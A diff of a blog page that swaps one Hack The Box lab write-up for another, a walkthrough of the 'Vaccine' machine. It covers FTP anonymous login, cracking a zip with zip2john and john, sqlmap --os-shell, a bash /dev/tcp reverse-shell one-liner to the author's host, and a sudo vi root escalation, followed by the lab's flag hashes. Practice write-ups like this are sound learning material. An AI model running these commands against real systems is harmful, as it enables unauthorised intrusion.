@@ -9,24 +9,24 @@
     <meta name="generator" content="Retype 3.5.0">
 
     <!-- Primary Meta Tags -->
-    <title>4. Appointment (Tier 1)</title>
-    <meta name="title" content="4. Appointment (Tier 1)">
-    <meta name="description" content="In this post our target is Appointment. From the description it seems that this is a DB related one.">
+    <title>5. Vaccine (Tier 2)</title>
+    <meta name="title" content="5. Vaccine (Tier 2)">
+    <meta name="description" content="We are moving to the Tier 2 machines from the very easy ones.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://cybnix.github.io/hack-the-box-(htb)/very-easy/appointment/">
+    <link rel="canonical" href="https://cybnix.github.io/hack-the-box-(htb)/very-easy/vaccine/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://cybnix.github.io/hack-the-box-(htb)/very-easy/appointment/">
-    <meta property="og:title" content="4. Appointment (Tier 1)">
-    <meta property="og:description" content="In this post our target is Appointment. From the description it seems that this is a DB related one.">
+    <meta property="og:url" content="https://cybnix.github.io/hack-the-box-(htb)/very-easy/vaccine/">
+    <meta property="og:title" content="5. Vaccine (Tier 2)">
+    <meta property="og:description" content="We are moving to the Tier 2 machines from the very easy ones.">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://cybnix.github.io/hack-the-box-(htb)/very-easy/appointment/">
-    <meta property="twitter:title" content="4. Appointment (Tier 1)">
-    <meta property="twitter:description" content="In this post our target is Appointment. From the description it seems that this is a DB related one.">
+    <meta property="twitter:url" content="https://cybnix.github.io/hack-the-box-(htb)/very-easy/vaccine/">
+    <meta property="twitter:title" content="5. Vaccine (Tier 2)">
+    <meta property="twitter:description" content="We are moving to the Tier 2 machines from the very easy ones.">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -177,14 +177,14 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="4-appointment-tier-1" class="break-words">
+<doc-anchor-target id="5-vaccine-tier-2" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#4-appointment-tier-1">#</doc-anchor-trigger>
-        <span>4. Appointment (Tier 1)</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#5-vaccine-tier-2">#</doc-anchor-trigger>
+        <span>5. Vaccine (Tier 2)</span>
     </h1>
 </doc-anchor-target>
-<img src="/static/htb/appointment/appointment.png" style="border-radius: 10px; width: 40%;"/>
-<p>In this post our target is Appointment. From the description it seems that this is a DB related one.</p>
+<img src="/static/htb/vaccine/vaccine.png" style="border-radius: 10px; width: 40%;"/>
+<p>We are moving to the Tier 2 machines from the very easy ones.</p>
 <hr>
 <doc-anchor-target id="booting-up-and-doing-the-tasks">
     <h2>
@@ -192,10 +192,9 @@
         <span>Booting up and doing the tasks</span>
     </h2>
 </doc-anchor-target>
-<p>Booting up the machine and pinging it. I will be using ParrotOS for this one instead of Kali (just testing).
-<br></br>
-<img src="/static/htb/appointment/appointment2.png" style="border-radius: 10px; width: 40%;"/> <img src="/static/htb/appointment/appointment3.png" style="border-radius: 10px; width: 70%;"/></p>
-<p>Time for the tasks related to this machine.</p>
+<p>We have started the machine and checked if it is accessible.</p>
+<p><img src="/static/htb/vaccine/vaccine3.png" style="border-radius: 10px; width: 50%;"/> <img src="/static/htb/vaccine/vaccine2.png" style="border-radius: 10px; width: 50%;"/></p>
+<p>Now we are going to do the tasks.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-green-500"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -209,9 +208,11 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 1</h5>
-<p>What does the acronym SQL stand for?</p>
+<p>Besides SSH and HTTP, what other service is hosted on this box?</p>
 <blockquote>
-<p><strong>Structured Query Language</strong> (easy!)</p>
+<p><strong>FTP</strong> (we found it with a default nmap scan)
+<br><br>
+<img src="/static/htb/vaccine/vaccine4.png" style="border-radius: 10px; width: 50%;"/></p>
 </blockquote>
         </div>
     </div>
@@ -229,9 +230,10 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 2</h5>
-<p>What is one of the most common type of SQL vulnerabilities?</p>
+<p>This service can be configured to allow login with any password for specific username. What is that username?</p>
 <blockquote>
-<p><strong>sql injection</strong> (we all know that, don&#x27;t we <span class="docs-emoji">&#x1F60F;</span>)</p>
+<p><strong>anonymous</strong> (I have learned that we always need to give &quot;anonymous&quot; a try)
+<img src="/static/htb/vaccine/vaccine5.png" style="border-radius: 10px; width: 50%;"/></p>
 </blockquote>
         </div>
     </div>
@@ -249,9 +251,10 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 3</h5>
-<p>What is the 2021 OWASP Top 10 classification for this vulnerability?</p>
+<p>What is the name of the file downloaded over this service?</p>
 <blockquote>
-<p><strong>A03:2021-Injection</strong> (<a href="https://owasp.org/Top10/">OWASP top 10</a>)</p>
+<p><strong>backup.zip</strong> (as seen on the previous screenshot, backup.zip can be downloaded from the FTP)
+<img src="/static/htb/vaccine/vaccine6.png" style="border-radius: 10px; width: 50%;"/></p>
 </blockquote>
         </div>
     </div>
@@ -269,11 +272,15 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 4</h5>
-<p>What does Nmap report as the service and version that are running on port 80 of the target?</p>
+<p>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?</p>
 <blockquote>
-<p><strong>Apache httpd 2.4.38 ((Debian))</strong> (We ran a Nmap scan to verify that)
+<p><strong>zip2john</strong> (a very nice tool that generates a hash from a pw protected archive)
 <br><br>
-<img src="/static/htb/appointment/appointment4.png" style="border-radius: 10px; width: 60%;"/></p>
+We have taken the hash with the tool.
+<img src="/static/htb/vaccine/vaccine7.png" style="border-radius: 10px; width: 80%;"/>
+<br><br>
+We have ran john to find the password of the zip:
+<img src="/static/htb/vaccine/vaccine10.png" style="border-radius: 10px; width: 80%;"/></p>
 </blockquote>
         </div>
     </div>
@@ -291,10 +298,17 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 5</h5>
-<p>What is the standard port used for the HTTPS protocol?</p>
+<p>What is the password for the admin user on the website?</p>
 <blockquote>
-<p><strong>443</strong> (easy!)</p>
+<p><strong>qwerty789</strong></p>
 </blockquote>
+<p>First we found the password hash from one of the files in the zip after we have cracked the zip pass in the previous step.
+<img src="/static/htb/vaccine/vaccine8.png" style="border-radius: 10px; width: 80%;"/>
+<br><br>
+Then we ran john + rockyou wordlist against that hash that we have stored in hash.txt
+<img src="/static/htb/vaccine/vaccine9.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>We have managed to log in with <strong>admin/qwerty789</strong> on the available webpage
+<img src="/static/htb/vaccine/vaccine11.png" style="border-radius: 10px; width: 80%;"/></p>
         </div>
     </div>
 </div>
@@ -311,10 +325,20 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 6</h5>
-<p>What is a folder called in web-application terminology?</p>
+<p>What option can be passed to sqlmap to try to get command execution via the sql injection?</p>
 <blockquote>
-<p><strong>directory</strong> (another easy one!)</p>
+<p><strong>--os-shell</strong> (This will instruct sqlmap to try spawning an interactive os shell if the SQL injection is exploitable)</p>
 </blockquote>
+<p>(You can see that the IP is different but that is due to the fact I am continuing this at another day so the spawned VM has changed its address.)</p>
+<p><br><br>
+So first thing to do is to start our burp and capture the request.
+<img src="/static/htb/vaccine/vaccine12.png" style="border-radius: 10px; width: 80%;"/>
+<img src="/static/htb/vaccine/vaccine13.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>What I&#x27;ll do now is save this request to a file called &quot;sqli.req&quot;. The thing I&#x27;ll do with the file is that I will run a sqlmap on it so it will basically test all fields automatically. I&#x27;ve learned that sometimes it is way better to do that since there could be more complex scenarios where it will be a bit challenging to specify in the url if we used one instead.</p>
+<p>We will run our command the following way, using --batch so we can put sqlmap into non-interactive mode which means it will use default options for prompts.
+<img src="/static/htb/vaccine/vaccine14.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>Seems that the target is vulnerable and we got an os-shell.
+<img src="/static/htb/vaccine/vaccine15.png" style="border-radius: 10px; width: 80%;"/></p>
         </div>
     </div>
 </div>
@@ -331,75 +355,68 @@
         </div>
         <div class="pr-5 ml-3 w-full">
             <h5>Task 7</h5>
-<p>What is the HTTP response code is given for &#x27;Not Found&#x27; errors?</p>
+<p>What program can the postgres user run as root using sudo?</p>
 <blockquote>
-<p><strong>404</strong> (We have all seen that <span class="docs-emoji">&#x1F616;</span> - <a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">https://en.wikipedia.org/wiki/List_of_HTTP_status_codes</a>)</p>
+<p><strong>vi</strong> (check how we found it with the steps below, took me a while)</p>
 </blockquote>
-        </div>
-    </div>
-</div>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-green-500"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-green-500" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M21 9.09c-.55 0-1 .45-1 1v.92c0 4.96-4.04 8.99-9 8.99-4.97 0-9-4.04-9-9s4.04-9 9-9c1.27 0 2.5.26 3.66.78.51.22 1.1 0 1.32-.51.23-.5 0-1.1-.51-1.32C14.06.32 12.56 0 11.01 0H11C4.94 0 0 4.93 0 10.99 0 17.06 4.93 22 10.99 22H11c6.06 0 11-4.93 11-10.99v-.92c0-.56-.45-1-1-1z"></path>
-                    <path d="M8.71 9.31a.996.996 0 10-1.41 1.41l3 3c.19.19.44.29.71.29.27 0 .52-.11.71-.29l10-10.01a.996.996 0 10-1.41-1.41L11 11.6 8.71 9.31z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-            <h5>Task 8</h5>
-<p>Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we&#x27;re looking to discover directories, and not subdomains?</p>
-<blockquote>
-<p><strong>dir</strong> (we can check that with <strong>gobuster -h</strong>)
+<p>The os-shell is kind of broken and doesn&#x27;t work well so we will try to open a reverse shell. I&#x27;ll set up a listener on my machine:
+<img src="/static/htb/vaccine/vaccine16.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>And then I&#x27;ll run : <em><strong>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.245/1337 0&gt;&amp;1&quot;</strong></em> (basically it should open an interractive shell towards my host)</p>
+<img src="/static/htb/vaccine/vaccine17.png" style="border-radius: 10px; width: 80%;"/>
 <br><br>
-<img src="/static/htb/appointment/appointment5.png" style="border-radius: 10px; width: 60%;"/></p>
-</blockquote>
-        </div>
-    </div>
-</div>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-green-500"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-green-500" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M21 9.09c-.55 0-1 .45-1 1v.92c0 4.96-4.04 8.99-9 8.99-4.97 0-9-4.04-9-9s4.04-9 9-9c1.27 0 2.5.26 3.66.78.51.22 1.1 0 1.32-.51.23-.5 0-1.1-.51-1.32C14.06.32 12.56 0 11.01 0H11C4.94 0 0 4.93 0 10.99 0 17.06 4.93 22 10.99 22H11c6.06 0 11-4.93 11-10.99v-.92c0-.56-.45-1-1-1z"></path>
-                    <path d="M8.71 9.31a.996.996 0 10-1.41 1.41l3 3c.19.19.44.29.71.29.27 0 .52-.11.71-.29l10-10.01a.996.996 0 10-1.41-1.41L11 11.6 8.71 9.31z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-            <h5>Task 9</h5>
-<p>What single character can be used to comment out the rest of a line in MySQL?</p>
-<blockquote>
-<p><strong>#</strong> (easy!)</p>
-</blockquote>
-        </div>
-    </div>
-</div>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-green-500"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-green-500" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M21 9.09c-.55 0-1 .45-1 1v.92c0 4.96-4.04 8.99-9 8.99-4.97 0-9-4.04-9-9s4.04-9 9-9c1.27 0 2.5.26 3.66.78.51.22 1.1 0 1.32-.51.23-.5 0-1.1-.51-1.32C14.06.32 12.56 0 11.01 0H11C4.94 0 0 4.93 0 10.99 0 17.06 4.93 22 10.99 22H11c6.06 0 11-4.93 11-10.99v-.92c0-.56-.45-1-1-1z"></path>
-                    <path d="M8.71 9.31a.996.996 0 10-1.41 1.41l3 3c.19.19.44.29.71.29.27 0 .52-.11.71-.29l10-10.01a.996.996 0 10-1.41-1.41L11 11.6 8.71 9.31z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-            <h5>Task 10</h5>
-<p>If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</p>
-<blockquote>
-<p><strong>Congratulations</strong> (check the description below)
+<p>Now we got the shell :
 <br><br>
-Now it is very important that we use <strong>admin&#x27;#</strong> instead of <strong>admin#</strong> as user for this to work. It took me some time to realise that. The single quote will let the SQL server know where the username ends, it&#x27;s like we use a period in a sentence. If we don&#x27;t use the quote, SQL will think that the user is &quot;<strong>admin#</strong>&quot;. This was a bit tricky!</p>
+<img src="/static/htb/vaccine/vaccine18.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>I found some flag but I think this is the answer for the next step.
+<img src="/static/htb/vaccine/vaccine19.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>So we had to find some password so we can &quot;sudo -l&quot;. Took me probably like 30 minutes to cat around files but found this in the end:</p>
+<img src="/static/htb/vaccine/vaccine20.png" style="border-radius: 10px; width: 80%;"/>
+<br><br>
+Seems to be a php file located in /var/www/html that has credentials in it. 
+<img src="/static/htb/vaccine/vaccine21.png" style="border-radius: 10px; width: 80%;"/>
+<br><br>
+Using this pass as sudo seems to work and upon running "sudo -l" we can see that we can edit some conf file with vi as a sudo user.
+<img src="/static/htb/vaccine/vaccine22.png" style="border-radius: 10px; width: 80%;"/>
+<p>My shell constantly breaks at this point and doesn&#x27;t work well. I can&#x27;t even properly see the contents of the file that we can edit as sudo. There are privilege escalation exploits via vi so we would want to try that. However first I need to have a stable connection. If we go back to the nmap scan we can see that we have ssh opened, so that&#x27;s right, I will try to ssh for more stable connection.
+<img src="/static/htb/vaccine/vaccine23.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>After a lot of struggle we are finally in and we can try our command as sudo<span class="docs-emoji">&#x1F635;</span>
+<img src="/static/htb/vaccine/vaccine24.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>Okay seems to be working now. So we got to find an exploit for that.
+<img src="/static/htb/vaccine/vaccine25.png" style="border-radius: 10px; width: 80%;"/></p>
+<p>This is a great example I found: <a href="https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e">https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e</a> . As per this post it seems that we can spawn ourselves a shell through vi as it is already running as root. (:!/bin/bash)</p>
+<img src="/static/htb/vaccine/vaccine26.png" style="border-radius: 10px; width: 70%;"/>
+<br><br>
+There we go, we are having a shell as a root now.
+<img src="/static/htb/vaccine/vaccine27.png" style="border-radius: 10px; width: 70%;"/>
+<p>Now the last task is to find the root flag. So far as per my observations  the flags are mostly hidden in .txt files. What I am going to do to save myself some manual navigation as I did when finding the user flag, I will just type the following :
+<strong>find / -type f -name &quot;*.txt&quot;</strong>. That way I will just see all the .txt files under the / directory.</p>
+<p>Well it took me only a few minutes of manual scrolling to find that <span class="docs-emoji">&#x1F602;</span>. Way better than the last time I guess.</p>
+<img src="/static/htb/vaccine/vaccine28.png" style="border-radius: 10px; width: 70%;"/>
+<br><br>
+There we go!
+<br></br>
+<img src="/static/htb/vaccine/vaccine29.png" style="border-radius: 10px; width: 50%;"/>
+<br></br>
+        </div>
+    </div>
+</div>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-green-500"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-green-500" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M21 9.09c-.55 0-1 .45-1 1v.92c0 4.96-4.04 8.99-9 8.99-4.97 0-9-4.04-9-9s4.04-9 9-9c1.27 0 2.5.26 3.66.78.51.22 1.1 0 1.32-.51.23-.5 0-1.1-.51-1.32C14.06.32 12.56 0 11.01 0H11C4.94 0 0 4.93 0 10.99 0 17.06 4.93 22 10.99 22H11c6.06 0 11-4.93 11-10.99v-.92c0-.56-.45-1-1-1z"></path>
+                    <path d="M8.71 9.31a.996.996 0 10-1.41 1.41l3 3c.19.19.44.29.71.29.27 0 .52-.11.71-.29l10-10.01a.996.996 0 10-1.41-1.41L11 11.6 8.71 9.31z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>SUBMIT FLAG</h5>
+<p>Submit user flag</p>
+<blockquote>
+<p><strong>ec9b13ca4d6229cd5cc1e09980965bf7</strong> (found at the start of Task 7)</p>
 </blockquote>
-<img src="/static/htb/appointment/appointment6.png" style="border-radius: 10px; width: 60%;"/>
         </div>
     </div>
 </div>
@@ -418,8 +435,7 @@ Now it is very important that we use <strong>admin&#x27;#</strong> instead of <s
             <h5>SUBMIT FLAG</h5>
 <p>Submit root flag</p>
 <blockquote>
-<p><strong>e3d0796d002a446c0e622226f42e9672</strong> (we got it after logging in)
-<img src="/static/htb/appointment/appointment7.png" style="border-radius: 10px; width: 60%;"/></p>
+<p><strong>dd6e058e814260bc70e9bbdef2715849</strong> (found at the end of task 7)</p>
 </blockquote>
         </div>
     </div>
@@ -431,8 +447,8 @@ Now it is very important that we use <strong>admin&#x27;#</strong> instead of <s
         <span>Summary</span>
     </h2>
 </doc-anchor-target>
-<p>All tasks were pretty easy. However it took me some time to realise what is happening on step 10. Overall I think it is a nice machine for a beginner.</p>
-<img src="/static/htb/appointment/appointment8.png" style="border-radius: 10px; width: 60%;"/>
+<p>Well what can I say. It took me a while, had to work on this machine for 2 days to complete it. In my opinion this isn&#x27;t a &quot;Very Easy&quot; machine. Was quite interesting but I don&#x27;t think it&#x27;s even comparable to Fawn for example <span class="docs-emoji">&#x1F602;</span>. Took some research but I can say that I have learned a lot of new things. While it might be &quot;Very Easy&quot; for a professional, I can definitely say that it was a bit of a challenge.</p>
+<img src="/static/htb/vaccine/vaccine30.png" style="border-radius: 10px; width: 50%;"/>
 
                                 
                                 <!-- Required only on API pages -->
@@ -442,20 +458,20 @@ Now it is very important that we use <strong>admin&#x27;#</strong> instead of <s
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../hack-the-box-(htb)/very-easy/crocodile/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../hack-the-box-(htb)/very-easy/appointment/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">3. Crocodile (Tier 1)</span>
+                                                <span class="block mt-1">4. Appointment (Tier 1)</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../hack-the-box-(htb)/very-easy/vaccine/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../simulated-attacks/bee-box/ufileupload/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">5. Vaccine (Tier 2)</span>
+                                                <span class="block mt-1">Unrestricted File Upload (medium security level)</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -499,6 +515,6 @@ Now it is very important that we use <strong>admin&#x27;#</strong> instead of <s
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "4. Appointment (Tier 1)", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "5. Vaccine (Tier 2)", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
